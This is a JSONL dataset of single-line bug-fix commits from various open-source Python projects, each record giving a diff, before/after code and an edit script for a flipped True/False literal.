{"project": "pg_staging", "commit_sha": "6d7aeb66bf9173aa3c44b83f8d2cf0b2dd8bd33b", "parent_sha": "6a0070d919792ce45294ae5d4692289eccdfcc28", "file_path": "pgstaging/restore.py", "project_url": "https://github.com/dimitri/pg_staging", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class pgrestore:\n \n     def __init__(self, dbname, user, host, port, owner, maintdb, major,\n-                 restore_cmd = \"/usr/bin/pg_restore\", st = True,\n+                 restore_cmd = \"/usr/bin/pg_restore\", st = False,\n                  schemas = [], schemas_nodata = [],\n                  connect = True):\n         \"\"\" dump is a filename \"\"\"\n", "before": "def __init__ ( self , dbname , user , host , port , owner , maintdb , major , restore_cmd = \"/usr/bin/pg_restore\" , st = True , schemas = [ ] , schemas_nodata = [ ] , connect = True ) : \"\"\" dump is a filename \"\"\"", "after": "def __init__ ( self , dbname , user , host , port , owner , maintdb , major , restore_cmd = \"/usr/bin/pg_restore\" , st = False , schemas = [ ] , schemas_nodata = [ ] , connect = True ) : \"\"\" dump is a filename \"\"\"", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 2, 55, 2, 64], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 2, 60, 2, 64]]]"}
{"project": "SyVOLT", "commit_sha": "d122fc1b7947b9b3d356f7d0f0a6fb31d13b75e4", "parent_sha": "9635e686d7b5a62f8fab8609408aa334a6b0739c", "file_path": "path_condition_generator_worker.py", "project_url": "https://github.com/levilucio/SyVOLT", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -603,7 +603,7 @@ class path_condition_generator_worker(Process):\n         self.currentPathConditionSet = list(set(self.currentPathConditionSet))\n \n \n-        pruning_debug = True\n+        pruning_debug = False\n         if self.pruner.do_pruning:\n \n             #pruning_time = time.time()\n", "before": "pruning_debug = True", "after": "pruning_debug = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 29], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 25, 3, 29]]]"}
{"project": "SyVOLT", "commit_sha": "13f3085db03f46637645167a79aa9a3f94dfc8fd", "parent_sha": "38ab9f7d6ae39141b136c6de4d087a93f4f63dd9", "file_path": "pruner.py", "project_url": "https://github.com/levilucio/SyVOLT", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ class Pruner(object):\n \n-        self.debug = True\n+        self.debug = False\n \n         self.eu = EcoreUtils(metamodel)\n         #self.mmContainmentLinks = self.eu.getContainmentLinksForClasses()\n", "before": "self . debug = True", "after": "self . debug = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 1, 9, 1, 26], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 1, 22, 1, 26]]]"}
{"project": "requests", "commit_sha": "709828204a7f6f23a52a5169430c52d6913a9fc2", "parent_sha": "b355b678a9de0bd5e43bbb4d9299ab9fa8e6fd85", "file_path": "requests/sessions.py", "project_url": "https://github.com/yveson33/requests", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -235,7 +235,7 @@ class Session(object):\n \n-        kwargs.setdefault('allow_redirects', True)\n+        kwargs.setdefault('allow_redirects', False)\n         return self.request('head', url, **kwargs)\n \n \n", "before": "kwargs . setdefault ( 'allow_redirects' , True )", "after": "kwargs . setdefault ( 'allow_redirects' , False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 26, 1, 51], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 1, 46, 1, 50]]]"}
{"project": "rome", "commit_sha": "e3f4c949b9785696d32ac39ccab3ef9f9840e0b5", "parent_sha": "edc99ffd004eb0e4a64c92e93847e533a1c7f2a3", "file_path": "lib/rome/core/rows/rows.py", "project_url": "https://github.com/badock/rome", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -258,7 +258,7 @@ def construct_rows(models, criterions, hints, session=None):\n         authorized_secondary_indexes = get_attribute(selectable._model, \"_secondary_indexes\", [])\n         selected_hints = filter(lambda x: x.table_name == tablename and (x.attribute == \"id\" or x.attribute in authorized_secondary_indexes), hints)\n         reduced_hints = map(lambda x:(x.attribute, x.value), selected_hints)\n-        objects = get_objects(tablename, request_uuid=request_uuid, skip_loading=True, hints=reduced_hints)\n+        objects = get_objects(tablename, request_uuid=request_uuid, skip_loading=False, hints=reduced_hints)\n         list_results += [objects]\n     part3_starttime = current_milli_time()\n \n", "before": "objects = get_objects ( tablename , request_uuid = request_uuid , skip_loading = True , hints = reduced_hints )", "after": "objects = get_objects ( tablename , request_uuid = request_uuid , skip_loading = False , hints = reduced_hints )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 69, 3, 86], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 82, 3, 86]]]"}
{"project": "xDCIShare", "commit_sha": "0151a5c1ab310496b59702b8da95dfd9308cd806", "parent_sha": "834ccc383ff7d3cba3430799f539ea318cd7839e", "file_path": "hs_core/hydroshare/hs_bagit.py", "project_url": "https://github.com/RENCI/xDCIShare", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ def create_bag(resource):\n         out.write(resource.metadata.get_xml())\n \n     to_file_name = '{res_id}/data/resourcemetadata.xml'.format(res_id=resource.short_id)\n-    istorage.saveFile(from_file_name, to_file_name, False)\n+    istorage.saveFile(from_file_name, to_file_name, True)\n \n     # make the resource map\n     current_site_url = hs_core_utils.current_site_url()\n", "before": "istorage . saveFile ( from_file_name , to_file_name , False )", "after": "istorage . saveFile ( from_file_name , to_file_name , True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 59], [\"true:True\", \"T\"], 5], [\"Delete\", [\"false:False\", 3, 53, 3, 58]]]"}
{"project": "floris", "commit_sha": "c049c5d951622b9cbbaf0e80a7fa7d7a062bb022", "parent_sha": "567f5f59f347d73b83209ec253438c46a9b618c6", "file_path": "floris/simulation/wake_deflection/base_velocity_deflection.py", "project_url": "https://github.com/NREL/floris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ class VelocityDeflection():\n         else:\n             self.logger.info('Using default option of applying gch-based ' + \\\n                         'secondary steering (use_secondary_steering=True)')\n-            self.use_secondary_steering = False\n+            self.use_secondary_steering = True\n \n         if 'eps_gain' in self.parameter_dictionary:\n             self.eps_gain = bool(self.parameter_dictionary[\"eps_gain\"])\n", "before": "self . use_secondary_steering = False", "after": "self . use_secondary_steering = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 13, 3, 48], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 43, 3, 48]]]"}
{"project": "lutris", "commit_sha": "2fdca6fb8d27ecf3ba2756c0f48439553f691b7c", "parent_sha": "7bcbbf1c527372b681cdd29685c5aae78df9d217", "file_path": "lutris/util/jobs.py", "project_url": "https://github.com/MCOfficer/lutris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class AsyncCall(threading.Thread):\n                                         kwargs=kwargs)\n         self.function = function\n         self.on_done = on_done if on_done else lambda r, e: None\n-        self.daemon = kwargs.pop('daemon', False)\n+        self.daemon = kwargs.pop('daemon', True)\n \n         self.start()\n \n", "before": "self . daemon = kwargs . pop ( 'daemon' , False )", "after": "self . daemon = kwargs . pop ( 'daemon' , True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 50], [\"true:True\", \"T\"], 3], [\"Delete\", [\"false:False\", 3, 44, 3, 49]]]"}
{"project": "GitPython", "commit_sha": "332521ac1d94f743b06273e6a8daf91ce93aed7d", "parent_sha": "8324c4b38cf37af416833d36696577d8d35dce7f", "file_path": "git/cmd.py", "project_url": "https://github.com/scls19fr/GitPython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -700,7 +700,7 @@ class Git(LazyMixin):\n         finally:\n             self.update_environment(**old_env)\n \n-    def transform_kwargs(self, split_single_char_options=False, **kwargs):\n+    def transform_kwargs(self, split_single_char_options=True, **kwargs):\n         \"\"\"Transforms Python style kwargs into git command line options.\"\"\"\n         args = list()\n         for k, v in kwargs.items():\n", "before": "def transform_kwargs ( self , split_single_char_options = False , ** kwargs ) : \"\"\"Transforms Python style kwargs into git command line options.\"\"\" args = list ( ) for k , v in kwargs . items ( ) : ", "after": "def transform_kwargs ( self , split_single_char_options = True , ** kwargs ) : \"\"\"Transforms Python style kwargs into git command line options.\"\"\" args = list ( ) for k , v in kwargs . items ( ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 32, 3, 63], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 58, 3, 63]]]"}
{"project": "DendroPy", "commit_sha": "4ff1a6e619cd36e02d0f44ece2e6e19e93c30ed9", "parent_sha": "5076a2821d1a2f180b5a7db27cb8f517c6a7c012", "file_path": "dendropy/test/test_dataobject_create_treelist.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class TreeCreateTest(framework.DataObjectVerificationTestCase):\n \n     def testTreeFromTreeWithExtraKeywordArgsOK(self):\n         tree2 = dendropy.Tree(self.tree1, stream=None, format=None)\n-        self.assertDistinctButEqual(self.tree1, tree2, distinct_taxa=True, equal_oids=False)\n+        self.assertDistinctButEqual(self.tree1, tree2, distinct_taxa=False, equal_oids=False)\n \n     def testTreeFromFilePosArgsWithNoFormat(self):\n         self.assertRaises(error.UnspecifiedFormatError, dendropy.Tree, stream=StringIO(self.tree1_newick_str), taxon_set=self.tree1.taxon_set)\n", "before": "self . assertDistinctButEqual ( self . tree1 , tree2 , distinct_taxa = True , equal_oids = False )", "after": "self . assertDistinctButEqual ( self . tree1 , tree2 , distinct_taxa = False , equal_oids = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 56, 3, 74], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 70, 3, 74]]]"}
{"project": "DendroPy", "commit_sha": "929311ecd8a15bf883c074bbd1bb1d499ef2de5c", "parent_sha": "0d2b8c850f12beaaefcf6109af34c5f52df4ea86", "file_path": "dendropy/test/test_datamodel_tree_fundamental_edge.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class EdgeCloning(compare_and_validate.Comparator, unittest.TestCase):\n                 ):\n             self.compare_distinct_nodes(\n                     clone._head_node, self.n0,\n-                    taxon_namespace_scoped=True,\n+                    taxon_namespace_scoped=False,\n                     compare_annotations=True)\n \n if __name__ == \"__main__\":\n", "before": "self . compare_distinct_nodes ( clone . _head_node , self . n0 , taxon_namespace_scoped = True , compare_annotations = True )", "after": "self . compare_distinct_nodes ( clone . _head_node , self . n0 , taxon_namespace_scoped = False , compare_annotations = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 21, 3, 48], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 44, 3, 48]]]"}
{"project": "DendroPy", "commit_sha": "bc512ce7a81f64f8ed6c090372918209a9310155", "parent_sha": "302fca07089b6d00b1eddae648ab182d4b3df8c9", "file_path": "dendropy/datamodel/taxon.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -126,7 +126,7 @@ class TaxonNamespaceAssociated(object):\n             self._taxon_namespace = TaxonNamespace()\n         else:\n             self._taxon_namespace = taxon_namespace\n-        self.automigrate_taxon_namespace_on_assignment = True\n+        self.automigrate_taxon_namespace_on_assignment = False\n \n     def _get_taxon_namespace(self):\n         return self._taxon_namespace\n", "before": "self . automigrate_taxon_namespace_on_assignment = True", "after": "self . automigrate_taxon_namespace_on_assignment = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 62], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 58, 3, 62]]]"}
{"project": "DendroPy", "commit_sha": "b89c575274676d0c136078764bace1e49177072a", "parent_sha": "9b22a7d3563c86d2b5e25c97b8bf8416e629544e", "file_path": "dendropy/dataio/nexusreader.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -178,7 +178,7 @@ class NexusReader(ioservice.DataReader):\n         # then forwarded on ...\n         self.extract_comment_metadata = kwargs.pop('extract_comment_metadata', True)\n         kwargs[\"extract_comment_metadata\"] = self.extract_comment_metadata\n-        self.preserve_underscores = kwargs.get('preserve_underscores', True)\n+        self.preserve_underscores = kwargs.get('preserve_underscores', False)\n         self.case_sensitive_taxon_labels = kwargs.get('case_sensitive_taxon_labels', False)\n \n         # Create newick handler\n", "before": "self . preserve_underscores = kwargs . get ( 'preserve_underscores' , True )", "after": "self . preserve_underscores = kwargs . get ( 'preserve_underscores' , False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 47, 3, 77], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 3, 72, 3, 76]]]"}
{"project": "DendroPy", "commit_sha": "6d9a755e66d4fc9d48ca47fbdcad73a135ec6cbc", "parent_sha": "cc3ba83a28cd94c89917ec240ce84c3f64ad4539", "file_path": "dendropy/splits.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -212,7 +212,7 @@ class SplitDistribution(object):\n         self.split_edge_lengths = {}\n         self.split_node_ages = {}\n         self.ignore_edge_lengths = False\n-        self.ignore_node_ages = False\n+        self.ignore_node_ages = True\n         self.unrooted = True\n         self.__split_freqs = None\n         self.__trees_counted_for_freqs = 0\n", "before": "self . ignore_node_ages = False", "after": "self . ignore_node_ages = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 38], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 33, 3, 38]]]"}
{"project": "PSO2Proxy", "commit_sha": "c5ce53d70840a39394ebc5b91c323cb668113bde", "parent_sha": "34ae09496ca9f6216ee93299a841e1fb9c5c8dc2", "file_path": "proxy/plugins/GlobalChat.py", "project_url": "https://github.com/XenoWarrior/PSO2Proxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ def checkConfig(user):\n \tif user.playerId in data.clients.connectedClients:\n \t\tclientPrefs = data.clients.connectedClients[user.playerId].getPrefs()\n \t\tif 'globalChat' not in clientPrefs:\n-\t\t\tclientPrefs['globalChat'] = True\n+\t\t\tclientPrefs['globalChat'] = False\n \t\tdata.clients.connectedClients[user.playerId].setPrefs(clientPrefs)\n \n @plugins.commandHook(\"gon\")\n", "before": "clientPrefs [ 'globalChat' ] = True", "after": "clientPrefs [ 'globalChat' ] = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 4, 3, 36], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 32, 3, 36]]]"}
{"project": "ansible", "commit_sha": "d4db4267377f2fea017d49f33ea1922c69c74215", "parent_sha": "09ba1f38f16d78f8c0e2ffbb7e08858d76c184d4", "file_path": "lib/ansible/plugins/action/net_base.py", "project_url": "https://github.com/joedugdale/ansible", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -108,7 +108,7 @@ class ActionModule(ActionBase):\n                 conn.send_command('exit')\n \n         if 'fail_on_missing_module' not in self._task.args:\n-            self._task.args['fail_on_missing_module'] = False\n+            self._task.args['fail_on_missing_module'] = True\n \n         result = super(ActionModule, self).run(task_vars=task_vars)\n \n", "before": "self . _task . args [ 'fail_on_missing_module' ] = False", "after": "self . _task . args [ 'fail_on_missing_module' ] = True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 13, 3, 62], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 57, 3, 62]]]"}
{"project": "judge", "commit_sha": "a38de1216cc445e8496ebec6d0059f329470e1c4", "parent_sha": "4a89264af91d1822debdb60115e4c270e6255b04", "file_path": "dmoj/checkers/linecount.py", "project_url": "https://github.com/ByoungJoonIm/judge", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ from dmoj.utils.unicode import utf8bytes\n verdict = u\"\\u2717\\u2713\"\n \n \n-def check(process_output, judge_output, point_value, feedback=False,\n+def check(process_output, judge_output, point_value, feedback=True,\n           match=lambda p, j: p.strip() == j.strip(), **kwargs):\n     process_lines = list(filter(None, resplit(b'[\\r\\n]', utf8bytes(process_output))))\n     judge_lines = list(filter(None, resplit(b'[\\r\\n]', utf8bytes(judge_output))))\n", "before": "def check ( process_output , judge_output , point_value , feedback = False , match = lambda p , j : p . strip ( ) == j . strip ( ) , ** kwargs ) : process_lines = list ( filter ( None , resplit ( b'[\\r\\n]' , utf8bytes ( process_output ) ) ) ) judge_lines = list ( filter ( None , resplit ( b'[\\r\\n]' , utf8bytes ( judge_output ) ) ) )", "after": "def check ( process_output , judge_output , point_value , feedback = True , match = lambda p , j : p . strip ( ) == j . strip ( ) , ** kwargs ) : process_lines = list ( filter ( None , resplit ( b'[\\r\\n]' , utf8bytes ( process_output ) ) ) ) judge_lines = list ( filter ( None , resplit ( b'[\\r\\n]' , utf8bytes ( judge_output ) ) ) )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 54, 3, 68], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 63, 3, 68]]]"}
{"project": "praw", "commit_sha": "d821b5a92ce8b1f11cf0e7eb07e6e4f01346ad20", "parent_sha": "a692e77ddc2833ef5e08f49debcbb6e3125ba1fe", "file_path": "praw/objects.py", "project_url": "https://github.com/shantnu/praw", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -736,7 +736,7 @@ class Redditor(Gildable, Messageable, Refreshable):\n     get_submitted = _get_redditor_listing('submitted')\n \n     def __init__(self, reddit_session, user_name=None, json_dict=None,\n-                 fetch=True):\n+                 fetch=False):\n         \"\"\"Construct an instance of the Redditor object.\"\"\"\n         info_url = reddit_session.config['user_about'] % user_name\n         # name is set before calling the parent constructor so that the\n", "before": "def __init__ ( self , reddit_session , user_name = None , json_dict = None , fetch = True ) : \"\"\"Construct an instance of the Redditor object.\"\"\" info_url = reddit_session . config [ 'user_about' ] % user_name", "after": "def __init__ ( self , reddit_session , user_name = None , json_dict = None , fetch = False ) : \"\"\"Construct an instance of the Redditor object.\"\"\" info_url = reddit_session . config [ 'user_about' ] % user_name", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 18, 3, 28], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 24, 3, 28]]]"}
{"project": "translate", "commit_sha": "afaa4e7bfaa2674b9e81b26cd41cff1eb5a3660b", "parent_sha": "5b81a4c6a90626fa49b668c9850fe19cce22dcd2", "file_path": "translate/storage/mozilla_lang.py", "project_url": "https://github.com/nschonni/translate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ class LangStore(txt.TxtFile):\n     Name = _(\"Mozilla .lang\")\n     Extensions = ['lang']\n \n-    def __init__(self, inputfile=None, flavour=None, encoding=\"utf-8\", mark_active=True):\n+    def __init__(self, inputfile=None, flavour=None, encoding=\"utf-8\", mark_active=False):\n         self.is_active = False\n         self.mark_active = mark_active\n         super(LangStore, self).__init__(inputfile, flavour, encoding)\n", "before": "def __init__ ( self , inputfile = None , flavour = None , encoding = \"utf-8\" , mark_active = True ) : self . is_active = False self . mark_active = mark_active super ( LangStore , self ) . __init__ ( inputfile , flavour , encoding )", "after": "def __init__ ( self , inputfile = None , flavour = None , encoding = \"utf-8\" , mark_active = False ) : self . is_active = False self . mark_active = mark_active super ( LangStore , self ) . __init__ ( inputfile , flavour , encoding )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 72, 3, 88], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 84, 3, 88]]]"}
{"project": "ikpy", "commit_sha": "09ec9cf7a1abaeba4c3f6151e94f360be23281f0", "parent_sha": "9720db7514d2eff87485374f1d5235e7f53f02ed", "file_path": "src/ikpy/link.py", "project_url": "https://github.com/Roboticia/ikpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class URDFLink(Link):\n \n-    def __init__(self, name, translation_vector, orientation, rotation, bounds=(None, None), angle_representation=\"rpy\", use_symbolic_matrix=False):\n+    def __init__(self, name, translation_vector, orientation, rotation, bounds=(None, None), angle_representation=\"rpy\", use_symbolic_matrix=True):\n         Link.__init__(self, name=name, bounds=bounds)\n         self.use_symbolic_matrix = use_symbolic_matrix\n         self.translation_vector = np.array(translation_vector)\n", "before": "def __init__ ( self , name , translation_vector , orientation , rotation , bounds = ( None , None ) , angle_representation = \"rpy\" , use_symbolic_matrix = False ) : Link . __init__ ( self , name = name , bounds = bounds ) self . use_symbolic_matrix = use_symbolic_matrix self . translation_vector = np . array ( translation_vector )", "after": "def __init__ ( self , name , translation_vector , orientation , rotation , bounds = ( None , None ) , angle_representation = \"rpy\" , use_symbolic_matrix = True ) : Link . __init__ ( self , name = name , bounds = bounds ) self . use_symbolic_matrix = use_symbolic_matrix self . translation_vector = np . array ( translation_vector )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 1, 122, 1, 147], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 1, 142, 1, 147]]]"}
{"project": "ds_tempest_rm_me_please", "commit_sha": "c368dde1dc33c6d6469b8c731051442726756a20", "parent_sha": "72f5306c23c310d1b0673b611a69dd21f93ec5f8", "file_path": "tempest/scenario/test_network_basic_ops.py", "project_url": "https://github.com/gamado/ds_tempest_rm_me_please", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -757,7 +757,7 @@ class TestNetworkBasicOps(manager.NetworkScenarioTest):\n \n         # Create server\n         self._setup_network_and_servers()\n-        self.check_public_network_connectivity(should_connect=False)\n+        self.check_public_network_connectivity(should_connect=True)\n         self._create_new_network()\n         self._hotplug_server()\n         fip, server = self.floating_ip_tuple\n", "before": "self . check_public_network_connectivity ( should_connect = False )", "after": "self . check_public_network_connectivity ( should_connect = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 48, 3, 68], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 63, 3, 68]]]"}
{"project": "ds_tempest_rm_me_please", "commit_sha": "4654515aeffef22458e174b4894e785a5c36ac04", "parent_sha": "36754ed87ddd09d2cfe264f6b548b25dfaf87d89", "file_path": "tempest/cmd/account_generator.py", "project_url": "https://github.com/gamado/ds_tempest_rm_me_please", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -234,7 +234,7 @@ def _parser_add_args(parser):\n     parser.add_argument('-r', '--concurrency',\n                         default=1,\n                         type=int,\n-                        required=True,\n+                        required=False,\n                         dest='concurrency',\n                         help='Concurrency count')\n     parser.add_argument('--with-admin',\n", "before": "parser . add_argument ( '-r' , '--concurrency' , default = 1 , type = int , required = True , dest = 'concurrency' , help = 'Concurrency count' )", "after": "parser . add_argument ( '-r' , '--concurrency' , default = 1 , type = int , required = False , dest = 'concurrency' , help = 'Concurrency count' )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 25, 3, 38], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 34, 3, 38]]]"}
{"project": "bluesky", "commit_sha": "141d2070aa86f8c8e56531eaf92f578ac8cc23eb", "parent_sha": "0cf9314044af5db747eb2ce73178cc54478e6ae8", "file_path": "bluesky/run_engine.py", "project_url": "https://github.com/sameera2004/bluesky", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -407,7 +407,7 @@ class RunEngine:\n         for name in self._queues.keys():\n             self._register_scan_callback(name, make_push_func(name))\n \n-        self.verbose = True\n+        self.verbose = False\n \n     def _clear(self):\n         self._bundling = False\n", "before": "self . verbose = True", "after": "self . verbose = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 28], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 24, 3, 28]]]"}
{"project": "testTeamcity", "commit_sha": "ffd99d3231f429e83a37e5770c7d44856f0a6c40", "parent_sha": "0c6acdaef69a43dfb150b29aa7ffac38a85abfff", "file_path": "tests.py", "project_url": "https://github.com/olafleur/testTeamcity", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3,7 +3,7 @@ import unittest\n \n class DesTests(unittest.TestCase):\n     def test(self):\n-        self.assertTrue(False)\n+        self.assertTrue(True)\n \n \n if __name__ == '__main__':\n", "before": "self . assertTrue ( False )", "after": "self . assertTrue ( True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 24, 3, 31], [\"true:True\", \"T\"], 1], [\"Delete\", [\"false:False\", 3, 25, 3, 30]]]"}
{"project": "sublime-xdk-package", "commit_sha": "0c6880980df0c5465a803847a7572f0df5dc1367", "parent_sha": "e0d396fc66e1c455f3f3d840ed5c0c90cc0e5004", "file_path": "XDK/XDKCore.py", "project_url": "https://github.com/iamxiaoma/sublime-xdk-package", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ else:\n PLUGIN_PATH = os.path.dirname(os.path.abspath(__file__))\n CONFIG_FILE = os.path.join(PLUGIN_PATH, 'xdk_plugin.conf')\n API_VERSION = '0.0.1'\n-DEBUG_ENABLED = True\n+DEBUG_ENABLED = False \n MSGS = {\n \t'SPECIFIED_DIRECTORY_IS_NOT_XDK': u'Path specified in configuration is not Intel\u00ae XDK one. Please enter correct XDK folder in the prompt below.',\n", "before": "DEBUG_ENABLED = True", "after": "DEBUG_ENABLED = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 1, 3, 21], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 17, 3, 21]]]"}
{"project": "HiggsAnalysis-KITHiggsToTauTau", "commit_sha": "618ce23e69889542d24cdda17dd77311f3bd5373", "parent_sha": "95be8893ed9e634db0ef32f990f56bb2316d978e", "file_path": "python/plotting/configs/samples_run2.py", "project_url": "https://github.com/anehrkor/HiggsAnalysis-KITHiggsToTauTau", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -416,7 +416,7 @@ class Samples(samples.SamplesBase):\n \n \t\t\tif not \"EstimateTtbar\" in config.get(\"analysis_modules\", []):\n \t\t\t\tconfig.setdefault(\"analysis_modules\", []).append(\"EstimateTtbar\")\n-\t\t\tconfig.setdefault(\"ttbar_from_mc\", []).append(False)\n+\t\t\tconfig.setdefault(\"ttbar_from_mc\", []).append(True)\n \t\t\tconfig.setdefault(\"ttbar_shape_nicks\", []).append(\"ttj\"+nick_suffix)\n \t\t\tconfig.setdefault(\"ttbar_data_control_nicks\", []).append(\"noplot_ttj_data_control\"+nick_suffix)\n \t\t\tconfig.setdefault(\"ttbar_data_substract_nicks\", []).append(\" \".join([nick+nick_suffix for nick in \"noplot_ztt_mc_ttj_control noplot_zll_ttj_control noplot_wj_ttj_control noplot_vv_ttj_control\".split()]))\n", "before": "config . setdefault ( \"ttbar_from_mc\" , [ ] ) . append ( False )", "after": "config . setdefault ( \"ttbar_from_mc\" , [ ] ) . append ( True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 49, 3, 56], [\"true:True\", \"T\"], 1], [\"Delete\", [\"false:False\", 3, 50, 3, 55]]]"}
